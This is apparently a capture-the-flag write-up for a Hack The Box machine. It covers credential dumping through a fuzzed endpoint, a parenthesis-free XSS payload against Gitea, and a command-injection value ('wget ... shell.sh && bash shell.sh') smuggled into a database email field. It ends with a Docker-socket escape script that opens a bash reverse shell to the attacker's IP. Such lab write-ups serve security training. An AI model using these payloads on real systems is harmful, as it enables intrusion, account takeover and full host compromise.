---
description: Challenging Windows machine with unique docker escape!
---

# Extension

## Gaining Access

As usual, nmap scan to begin.

<figure><img src="../../../.gitbook/assets/image (3178).png" alt=""><figcaption></figcaption></figure>

When visiting port 80, we can see that it gives us a domain.

<figure><img src="../../../.gitbook/assets/image (2911).png" alt=""><figcaption></figcaption></figure>

The Get Started button directs us to a login page, where default admin:admin credentials do not work.

<figure><img src="../../../.gitbook/assets/image (3124).png" alt=""><figcaption></figcaption></figure>

For this particular domain, there are tons of vhosts when using gobuster to scan it.

<figure><img src="../../../.gitbook/assets/image (1167).png" alt=""><figcaption></figcaption></figure>

The most interesting of all was the first one, which hosted a Gitea instance.

<figure><img src="../../../.gitbook/assets/image (528).png" alt=""><figcaption></figcaption></figure>

Gitea has had some form of RCE exploits in the past, but this is running an updated version of the software, so no easy RCE for us.

### Dump Credentials

When analysing the page source for the iniital login page found on snippet.htb, we can see that it contains some JavaScript code pointing towards certain endpoints on the application.

The most interesting of it was this **management/dump** end point.

<figure><img src="../../../.gitbook/assets/image (405).png" alt=""><figcaption></figcaption></figure>

This endpoint takes a POST request, and some fuzzing of the login request using Burp tells us that this takes JSON parameters.

<figure><img src="../../../.gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>

When changing this endpoint to the /management/dump endpoint, we get a 400 response saying that we are missing arguments.

<figure><img src="../../../.gitbook/assets/image (3966).png" alt=""><figcaption></figcaption></figure>

Based on my understanding of /dump endpoints and HTB creators, this thing should dump out a bunch of useful credentials should we find the right argumenst to enter. We have no other hints, so fuzzing this thing is the way forward it seems.

We can use wfuzz to fuzz out the two parameters we need, filtering the responses by excluding those that have the "Missing Arguments" string.

<figure><img src="../../../.gitbook/assets/image (151).png" alt=""><figcaption><p><br></p></figcaption></figure>

Now we have the first parameter, then we can fuzz the next. When checking request using Burp, we can see that now we have the string "Unknown tablename".&#x20;

<figure><img src="../../../.gitbook/assets/image (994).png" alt=""><figcaption></figcaption></figure>

Then we can proceed to continue fuzzing the parameter with the new string. After a while, we find that "users" is the next valid value.

<figure><img src="../../../.gitbook/assets/image (3957).png" alt=""><figcaption></figcaption></figure>

Now, we can dump out all the possible credentials with passwords!

<figure><img src="../../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>

There's a lot of information that is dumped, so we can use curl to redirect the output into a file. Afterwards, we can extract the hashes and get cracking.

There's like over 890 hashes here, so cracking all of them is impossible without melting my laptop. In this case, we could use crackstation to test out 20 hashes at a time. Then, I would check for the occurrence of the hash within the main account. After a while, I managed to crack one.

<figure><img src="../../../.gitbook/assets/image (3864).png" alt=""><figcaption></figcaption></figure>

Analysis of the main file revealed that the users are&#x20;

* juliana@snippet.htb
* letha@snippet.htb
* fredrick@snippet.htb
* gia@snippet.htb

So we have 4 users that are using the same password. Using Juliana's account, I was able to login to the website on snippet.htb

<figure><img src="../../../.gitbook/assets/image (455).png" alt=""><figcaption></figcaption></figure>

### Adding Snippets

This website allows us to add snippets of code for others to view, or something like that. I tested this out by adding some simple snippet and viewing the request in Burpsuite.

<figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

Once we post snippets, we can edit them, and we can also make them public for all to see.

<figure><img src="../../../.gitbook/assets/image (1357).png" alt=""><figcaption></figcaption></figure>

I found this interesting because it referenced snippets by ID number. What's interesting is this was my first update, yet it was already the 3rd snippet posted. This tells me there is something hidden elsewhere. Upon changing this to 2, we can see a hidden snippet being posted by jean.

<figure><img src="../../../.gitbook/assets/image (1615).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3619).png" alt=""><figcaption></figcaption></figure>

This gives us credentials for jean! We can easily decode from base64 and find the credentials. Then we can login to Gitea as jean.

### Gitea XSS

Within Gitea, we can find a few push requests made by jean.

<figure><img src="../../../.gitbook/assets/image (1018).png" alt=""><figcaption></figcaption></figure>

Upon viewing the repository, there appears to be some form of JS script here that has a bad character filter being used:

{% code overflow="wrap" %}
```javascript
const list = document.getElementsByClassName("issue list")[0];

const log = console.log

if (!list) {
    log("No gitea page..")
} else {

    const elements = list.querySelectorAll("li");

    elements.forEach((item, index) => {

        const link = item.getElementsByClassName("title")[0]

        const url = link.protocol + "//" + link.hostname + "/api/v1/repos" + link.pathname

        log("Previewing %s", url)

        fetch(url).then(response => response.json())
            .then(data => {
                let issueBody = data.body;

                const limit = 500;
                if (issueBody.length > limit) {
                    issueBody = issueBody.substr(0, limit) + "..."
                }

                issueBody = ": " + issueBody

                issueBody = check(issueBody)

                const desc = item.getElementsByClassName("desc issue-item-bottom-row df ac fw my-1")[0]

                desc.innerHTML += issueBody

            });

    });
}

/**
 * @param str
 * @returns {string|*}
 */
function check(str) {

    // remove tags
    str = str.replace(/<.*?>/, "")

    const filter = [";", "\'", "(", ")", "src", "script", "&", "|", "[", "]"]

    for (const i of filter) {
        if (str.includes(i))
            return ""
    }

    return str

}

```
{% endcode %}

The filter portion seems to be missing the '<' and '>' character, and it blocks src and script, meaning that the next step would be an XSS of some kind. Looking at the users present on the Gitea instance, there is only one we are interested in, which is charlie.

<figure><img src="../../../.gitbook/assets/image (1313).png" alt=""><figcaption></figcaption></figure>

We probably need to have some form of XSS to access charlie's account to see some private repos. Since charlie is the only other user, and there has been hints to exploit XSS, I guess Charlie views the page or a repository from time to time. We aren't allowed to use brackets for our XSS payload, so we need to keep that in mind.

{% embed url="https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md" %}

Looking at the repo collaborators, we can see that the user charlie is indeed a collaborator.

<figure><img src="../../../.gitbook/assets/image (747).png" alt=""><figcaption></figcaption></figure>

From here, we can think about how to implement an XSS attack. Looking at inject.js, we can see that it makes a request to a certain url and checks for the issues. When adding to the issues, we can see that a payload `test<test><img SRC="http://10.10.x.x./test.txt">` works, meaning it bypasses the inject.js checks. After a while, the issue is closed, and I assume the user Charlie is the one closing them.

<figure><img src="../../../.gitbook/assets/image (1517).png" alt=""><figcaption></figcaption></figure>

So someone is indeed checking the issues, and we can exploit this fact. So now we need to somehow make charlie request for our page, and observation of Burp reqeusts implies we need to steal the CSRF token to access his hidden repositories.

<figure><img src="../../../.gitbook/assets/image (4040).png" alt=""><figcaption></figcaption></figure>

After some more testing, I come across the eval.call XSS method through the page, and was able to include this within the issues to get a hitback on my netcat listener!

This is the payload used: `test<test><img SRC="x" onerror=eval.call${"eval\x28atobZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC41LyIp\x29"}>`

<figure><img src="../../../.gitbook/assets/image (2765).png" alt=""><figcaption></figcaption></figure>

What this does is essentially is `fetch('http://10.10.x.x')` for Charlie to execute upon looking at the issues.

Now, we can use this XSS to send us the information from charlie's repos. This can be done using this payload:

<figure><img src="../../../.gitbook/assets/image (3919).png" alt=""><figcaption></figcaption></figure>

What this essentially does is this:

<figure><img src="../../../.gitbook/assets/image (3005).png" alt=""><figcaption></figcaption></figure>

We can view the callback:

<figure><img src="../../../.gitbook/assets/image (1777).png" alt=""><figcaption></figcaption></figure>

When decoded from base64, we can see that charlie has a backup of his home directory present on this Gitea instance, and pehaps there are SSH keys wthin it.

<figure><img src="../../../.gitbook/assets/image (3459).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2494).png" alt=""><figcaption></figcaption></figure>

We can save this file and proceed to access his private SSH keys.

<figure><img src="../../../.gitbook/assets/image (3251).png" alt=""><figcaption></figcaption></figure>

Now we can SSH in as Charlie!

<figure><img src="../../../.gitbook/assets/image (2261).png" alt=""><figcaption></figcaption></figure>

Jean has the user flag, and we can easily su to jean using the earlier credentials. **Important to note is that we could not SSH into jean in the first place was because our public key was denied access**.

<figure><img src="../../../.gitbook/assets/image (1203).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Upon checking ifconfig, we can see that there are loads of other network interfaces within this machine, indicating that we could be in a Docker container of some sort.

<figure><img src="../../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

I checked the open ports, and found that we had quite a few listening in.

<figure><img src="../../../.gitbook/assets/image (3487).png" alt=""><figcaption></figcaption></figure>

Port 9000 has some service running on it. Afterwards, I ran a linpeas just to enumerate everything and see what files we have acceess to. Nothing much came from this, however.

So we know there are a ton of different containers present on this machine. We just need to figure out how to get into one of them and perhaps escape. Based on LinPEAS, the containers are run by root, so that's one possible attack vector.

### Identifying RCE Vector

Within Jean's home directory, there is this laravel application running somewhere (I'm guessing port 9000 or something else).

<figure><img src="../../../.gitbook/assets/image (3377).png" alt=""><figcaption></figcaption></figure>

Within the PHP files, there had to be some form of vulnerability that would allow me to gain RCE, so I did a basic `grep -r <term>` for common PHP shells, like system, and shel&#x6C;_&#x65;xec._ Shell\_exec worked, as I saw this:

<figure><img src="../../../.gitbook/assets/image (3547).png" alt=""><figcaption></figcaption></figure>

Clearly takes user input from $domain and then just pings it. Very exploitable. We just need to find out how to execute this thing.

Using pspy64, we can find some mysql credentials:

<figure><img src="../../../.gitbook/assets/image (3688).png" alt=""><figcaption></figcaption></figure>

Let's take a look at this database.

### Loggin in as Manager

We first need to portforward this MySQL Instance from the machine before moving on. We can do so with SSH using charlie's private key easily. We need to do this because the host does not have mysql...? Perhaps the creator included an extra step on purpose.

<figure><img src="../../../.gitbook/assets/image (2257).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1589).png" alt=""><figcaption></figcaption></figure>

Earlier, we found 4 users, and from there we can update the database such that one of those users becomes a manager. I picked letha, but any is fine. The reason being the cronjob is only changing the password of charlie and jean, so we should use other users.&#x20;

<figure><img src="../../../.gitbook/assets/image (3008).png" alt=""><figcaption></figcaption></figure>

Then we can login as this user.

### Getting RCE

The managers are able to verify users basically, which ties in to where the RCE lies.

<figure><img src="../../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

We can view the request and see how it verifies the user.

<figure><img src="../../../.gitbook/assets/image (1763).png" alt=""><figcaption></figcaption></figure>

So how do we exploit this? We can either manipulate email we enter, or we can edit the database somehow.

<figure><img src="../../../.gitbook/assets/image (842).png" alt=""><figcaption></figcaption></figure>

However, based on this code, it uses some kind of APP\_SECRET, which I'm too lazy to find. So in this case, we can instead opt to add another user into the database with a command appended to the end in order to gain a reverse shell as the www-data.

We can host a malicious script on a HTTP server and use this insert command.

{% code overflow="wrap" %}
```
insert into users(name,email,email_verified_at,password,remember_token,created_at,updated_at,user_type) values ('testing','testing@ezpwn|wget 10.10.14.5/shell.sh && bash shell.sh', '2022-01-02 20:14:55','ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f','2KTrBJhwcS','2022-01-02 20:15:00','2022-01-02 20:15:00','Member');
```
{% endcode %}

Then we can find our user on the website.

<figure><img src="../../../.gitbook/assets/image (2900).png" alt=""><figcaption></figcaption></figure>

Once we hit validate, we will get a shell back as the application user.

<figure><img src="../../../.gitbook/assets/image (1041).png" alt=""><figcaption></figcaption></figure>

### Docker Escape

We are now in this container as another user, and the next step is to escape in order to become root or have root access to the machine. I'm not that great with Docker escape, so Hacktricks was a life saver here.

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation" %}

Early enumeration shows that there is a docker.sock in the /app/docker.sock directory. However, we can't run the docker command in this container, so there has to be another way.&#x20;

In this machine, there's one critical vulnerability, of which is that the docker.sock is writable.

<figure><img src="../../../.gitbook/assets/image (3787).png" alt=""><figcaption></figcaption></figure>

So we can enumerate further to find some docker exploits using curl.

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/authz-and-authn-docker-access-authorization-plugin" %}

After reading quite a bit on docker sockets, how they're not supposed to be writeable and so on, I found a working exploit here.

{% embed url="https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25" %}

We can edit this script a bit to fit our machine and then run it. Firstly, we need to change the image name based on this machine's config.

<figure><img src="../../../.gitbook/assets/image (2786).png" alt=""><figcaption></figcaption></figure>

We can then proceed to use the exploit. Finalized code:

```bash
#!/bin/bash

# you can see images availables with
# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
# here we have sandbox:latest

# command executed when container is started
# change dir to tmp where the root fs is mount and execute reverse shell

cmd="[\"/bin/sh\",\"-c\",\"chroot /tmp sh -c \\\"bash -c 'bash -i &>/dev/tcp/10.10.14.5/4444 0<&1'\\\"\"]"

# create the container and execute command, bind the root filesystem to it, name the container peterpwn_root and execute as detached (-d)
curl -s -X POST --unix-socket /app/docker.sock -d "{\"Image\":\"laravel-app_main\",\"cmd\":$cmd,\"Binds\":[\"/:/tmp:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create?name=test_root
 
# start the container
curl -s -X POST --unix-socket /app/docker.sock "http://localhost/containers/test_root/start"

```

Getting Shell:

<figure><img src="../../../.gitbook/assets/image (1498).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3829).png" alt=""><figcaption></figcaption></figure>

We can then grab the flag:

<figure><img src="../../../.gitbook/assets/image (2448).png" alt=""><figcaption></figcaption></figure>

Really hard machine.
